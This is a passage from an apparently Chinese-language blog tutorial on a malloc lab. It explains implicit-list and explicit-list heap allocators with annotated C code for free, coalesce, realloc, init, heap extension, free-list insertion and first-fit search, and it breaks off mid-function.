class="headerlink" title="mm_free"></a>mm_free</h3><p>可以看到，free也是相当简单的，将当前block的分配状态从1更新到0即可。然后做<strong>coalesce操作:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Freeing a block does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    coalesce(ptr);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free\n&quot;</span>);</span><br><span class="line">    print_allocated_info();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="coalesce"><a href="#coalesce" class="headerlink" title="coalesce"></a>coalesce</h3><p>free block后要考虑前后是否也有free block, 如果存在free block需要进行合并.下面给出了4种情况:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826205642747.png" alt="image-20200826205642747"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826205653451.png" alt="image-20200826205653451"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826205703127.png" alt="image-20200826205703127"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826205708948.png" alt="image-20200826205708948"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于存在序言块和尾块，避免了一些边界检查。</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> pre_alloc = GET_ALLOC(HDRP(PREV_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pre_alloc &amp;&amp; next_alloc)&#123;    <span class="comment">// case1: 前后都分配</span></span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pre_alloc &amp;&amp; !next_alloc)&#123;  <span class="comment">// case 2： 前分配，后free</span></span><br><span class="line">        <span class="keyword">void</span> *next_block = NEXT_BLKP(bp);</span><br><span class="line">        size += GET_SIZE(HDRP(next_block));</span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(next_block), PACK(size, <span class="number">0</span>));</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 其余两个tag不用清空？ 正常情况确实不用清空。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!pre_alloc &amp;&amp; next_alloc)&#123;  <span class="comment">// case 3: 前free，后分配</span></span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;      <span class="comment">// 前后两个都是free</span></span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp))) +</span><br><span class="line">                GET_SIZE(FTRP(NEXT_BLKP(bp)));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc"></a>mm_realloc</h3><p>realloc函数实现也很简单, 重新分配size大小的块,然后将旧块内容复制到新块内容上. 注意这里也考虑了block变小的情况.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_realloc - Implemented simply in terms of mm_malloc and mm_free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *oldptr = ptr;</span><br><span class="line">    <span class="keyword">void</span> *newptr;</span><br><span class="line">    <span class="keyword">size_t</span> copySize;</span><br><span class="line">    </span><br><span class="line">    newptr = mm_malloc(size);</span><br><span class="line">    <span class="keyword">if</span> (newptr == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    copySize = GET_SIZE(HDRP(oldptr));</span><br><span class="line">    <span class="keyword">if</span> (size &lt; copySize)</span><br><span class="line">      copySize = size;</span><br><span class="line">    <span class="built_in">memcpy</span>(newptr, oldptr, copySize);</span><br><span class="line">    mm_free(oldptr);</span><br><span class="line">    <span class="keyword">return</span> newptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ok, 以上就是implicit list的所有内容, 下面我们开始讲解explicit list的实现.</p><h2 id="4-explicit-list"><a href="#4-explicit-list" class="headerlink" title="4. explicit list"></a>4. explicit list</h2><p>explicit list和implicit list的区别在于前者在 <strong>逻辑空间</strong> 中维护一个free list, 里面只保存free的blocks, 而后者则是在 <strong>虚拟地址空间</strong>中维护整个list,里面即包含了free blocks也包含了allocated blocks. 当然了, explicit list底层也是虚拟地址空间.下面这张图给出了explicit list的上层结构:</p><p><img data-src="https://pic.downk.cc/item/5f465f2f160a154a67918a70.png" alt="image-20200826210834218"></p><p>下面给出implicit和explicit的每一块的具体结构对比:</p><p><img data-src="https://pic.downk.cc/item/5f465f75160a154a6791b829.png" alt="image-20200826211059458"></p><p>可以看到,explicit比较implicit,每一个块只是多了两个字段,用于保存下一个free block的地址(next)和上一个free block的地址(prev).</p><p>想一下,explict的优点: 大大提高搜索free block的效率. 但是实现复杂度比implicit难,因为多一个逻辑空间的操作.</p><p>首先第一个问题,next和prev占用多大空间? 对于32位的os来说,地址空间的编址大小的32位(4字节), 64位的os则位64位(8字节). 为了简单起见,本文中只考虑32位的情况(gcc编译时加上-m32的参数,默认的makefile已经给出).</p><p>好的现在确定了next和prev的大小,再来确定一个最小块的大小,最小块应该包含header+footer+next+prev+payload,其中payload最小为1个字节, 同时最小块应该保证8字节对齐要求,综合以上所述,一个最小块为:<br>$$<br>4+4+4+1+4=17,向上取8字节对齐,则\<br>MIN_BLOCK = 24<br>$$<br>ok,现在再说明代码中做的一些规定:</p><ol><li>find策略,采用first-fit策略</li><li>对于free后的block应该如何重新插入free list, 本文采用LIFO策略</li><li>对齐约定, 8字节对齐</li></ol><p>有了以上的说明, 差不多就可以写代码了,先从定义的宏出发:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* single word (4) or double word (8) alignment */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALIGNMENT 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* rounds up to the nearest multiple of ALIGNMENT */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WSIZE 4             <span class="comment">/* Word and header/footer size (bytes) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DSIZE 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNKSIZE (1 &lt;&lt; 12) <span class="comment">/* Extend heap by this amount (bytes) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(x, y) ((x) &gt; (y) ? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Pack a size and allocated bit into a word */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACK(size, alloc) ((size) | (alloc))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read and write a word at address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET(p) (*(unsigned int *)(p))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT(p, val) (*(unsigned int *)(p) = (unsigned int)(val))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read the size and allocated fields from address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of its header and footer */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HDRP(bp) ((char *)(bp)-3 * WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - 4 * WSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// free block运算：计算当前block的“NEXT&quot;指针域</span></span><br><span class="line"><span class="comment">// bp:当前block的payload首地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_PTR(bp) ((char *)(bp)-2 * WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_PTR(bp) ((char *)(bp)-WSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// free block运算： 计算下一个free block的payload首地址</span></span><br><span class="line"><span class="comment">// bp:当前block的payload首地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_FREE_BLKP(bp) ((char *)(*(unsigned int *)(NEXT_PTR(bp))))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_FREE_BLKP(bp) ((char *)(*(unsigned int *)(PREV_PTR(bp))))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// virtual address计算：计算下一个block的payload首地址</span></span><br><span class="line"><span class="comment">// bp: 当前block的payload首地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_BLKP(bp) ((char *)(bp)-GET_SIZE(HDRP(bp) - WSIZE))</span></span><br></pre></td></tr></table></figure><p>可以看到, 基本上和implicit的宏差不多, 只是多了NEXT_FREE_BLKP这类宏, 由于调整了每个block的具体layout(多了next和prev), 所以一些运算,如HDRP等需要对应调整.</p><p>然后就是各个函数:</p><blockquote><p>NOTE: 再次注意存在逻辑空间和虚拟地址空间两个空间.</p></blockquote><h3 id="mm-init-1"><a href="#mm-init-1" class="headerlink" title="mm_init"></a>mm_init</h3><p>这个函数的主要工作包括:</p><ol><li>分配 一个word+ MIN_BLOCK</li><li>第一个word是做pad用,用于保证后续分配的block能够8字节对齐,和implicit一样.</li><li>后面的MIN_BLOCK用于作为free_list_head, 和impilicit的序言块作用相同</li><li>最后分配一个CHUNK,分配函数的内部会将这个chunk块插入到free list 中.</li></ol><p>整体来说,explicit的mm_init和implicit的mm_init作用相同,但是组织方式发生了一些变化.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 申请一个块，用于存放root指针</span></span><br><span class="line">    <span class="keyword">char</span> *init_block_p;</span><br><span class="line">    <span class="keyword">if</span> ((init_block_p = mem_sbrk(MIN_BLOCK + WSIZE)) == (<span class="keyword">void</span> *)<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    init_block_p = (<span class="keyword">char</span> *)(init_block_p) + WSIZE; <span class="comment">// 跳过首个对齐块</span></span><br><span class="line"></span><br><span class="line">    free_list_head = init_block_p + <span class="number">3</span> * WSIZE;</span><br><span class="line">    PUT(PREV_PTR(free_list_head), <span class="literal">NULL</span>);</span><br><span class="line">    PUT(NEXT_PTR(free_list_head), <span class="literal">NULL</span>); <span class="comment">// 初始化root指针为NULL（0）</span></span><br><span class="line">    PUT(HDRP(free_list_head), PACK(MIN_BLOCK, <span class="number">1</span>));</span><br><span class="line">    PUT(FTRP(free_list_head), PACK(MIN_BLOCK, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Extend the empty heap with a free block of CHUNKSIZE bytes</span></span><br><span class="line">    <span class="keyword">if</span> ((allocate_from_chunk(CHUNKSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="allocate-from-heap"><a href="#allocate-from-heap" class="headerlink" title="allocate_from_heap"></a>allocate_from_heap</h3><p>allocate_from_heap做的工作很简单, 扩展heap大小, 然后将扩展出来的block插入到free_lilst中.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 扩展heap,并分配满足当前需求的块到free_list中</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param size  需求size 字节为单位</span></span><br><span class="line"><span class="comment"> * @return void*  成功：当前能够分配的块的首地址</span></span><br><span class="line"><span class="comment"> *                失败： NULL， 一般只在run out out memory时才会NULL </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">allocate_from_heap</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *cur_bp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">size_t</span> extend_size = MAX(size, CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span> ((cur_bp = extend_heap(extend_size / WSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入到free list中</span></span><br><span class="line">    insert_to_free_list(cur_bp);</span><br><span class="line">    <span class="keyword">return</span> cur_bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="extend-heap-1"><a href="#extend-heap-1" class="headerlink" title="extend_heap"></a>extend_heap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 扩展当前heap</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param words  需要扩展的words, 字为单位</span></span><br><span class="line"><span class="comment"> * @return void* 当前可用块的payload首地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate an even number of words to maintain alignment */</span></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * WSIZE : words * WSIZE;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    bp = (<span class="keyword">char</span> *)(bp) + <span class="number">3</span> * WSIZE; <span class="comment">// point to payload</span></span><br><span class="line">    <span class="comment">// set 本块信息</span></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="insert-to-free-list"><a href="#insert-to-free-list" class="headerlink" title="insert_to_free_list"></a>insert_to_free_list</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 将free block插入到free list中</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp free block的payload的首个地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insert_to_free_list</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *head = free_list_head;</span><br><span class="line">    <span class="keyword">void</span> *p = NEXT_FREE_BLKP(head); <span class="comment">// 当前首个有效节点 或者 NULL</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(head), bp);</span><br><span class="line">        PUT(NEXT_PTR(bp), <span class="literal">NULL</span>);</span><br><span class="line">        PUT(PREV_PTR(bp), head);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 更新当前要插入的节点</span></span><br><span class="line">        PUT(NEXT_PTR(bp), p);</span><br><span class="line">        PUT(PREV_PTR(bp), head);</span><br><span class="line">        <span class="comment">// 更新head</span></span><br><span class="line">        PUT(NEXT_PTR(head), bp);</span><br><span class="line">        <span class="comment">// 更新p节点(原首有效节点)</span></span><br><span class="line">        PUT(PREV_PTR(p), bp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>采用LIFO策略,将bp所指向的block插入到free_list中.</p><h3 id="mm-malloc-1"><a href="#mm-malloc-1" class="headerlink" title="mm_malloc"></a>mm_malloc</h3><p>注释中说了本函数的工作. 首先从free_list中看有没有适合的块, 否则从heap中分配.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_malloc, 根据 size 返回一个指针，该指针指向这个block的payload首地址</span></span><br><span class="line"><span class="comment"> * 主要工作：</span></span><br><span class="line"><span class="comment"> * 1. size的round操作，满足最小块需求以及对齐限制</span></span><br><span class="line"><span class="comment"> * 2. 首先检查当前free list中是否有可以满足 asize(adjusted size) ，有则place，（place可能需要split),无则第3步</span></span><br><span class="line"><span class="comment"> * 3. 从当前heap中分配新的free block， 插入到free list中，然后place</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> asize;      <span class="comment">// Adjusted block size</span></span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// step1: round size 满足最小块和对齐限制</span></span><br><span class="line">    asize = ALIGN(<span class="number">2</span> * DSIZE + size); <span class="comment">// 2*DSIZE = header+ footer + next + prev</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// step2: 从free list 中找free block</span></span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        place(bp, asize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;  <span class="comment">//free list中找不到</span></span><br><span class="line">        <span class="comment">// step3: 从当前heap中分配</span></span><br><span class="line">        <span class="keyword">if</span> ((bp = allocate_from_heap(asize)) == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        place(bp, asize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc\n&quot;</span>);</span><br><span class="line">    debug();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="find-fit-1"><a href="#find-fit-1" class="headerlink" title="find_fit"></a>find_fit</h3><p>从free list中找到第一个满足需求size的free block并返回该block的payload首地址.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 使用first-fit policy</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> * @return void* 成功，返回可用块的首地址</span></span><br><span class="line"><span class="comment"> *               失败，返回NULL</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (bp = NEXT_FREE_BLKP(free_list_head); bp != <span class="literal">NULL</span> &amp;&amp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_FREE_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (GET_ALLOC(HDRP(bp)) == <span class="number">0</span> &amp;&amp; size &lt;= GET_SIZE(HDRP(bp)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span 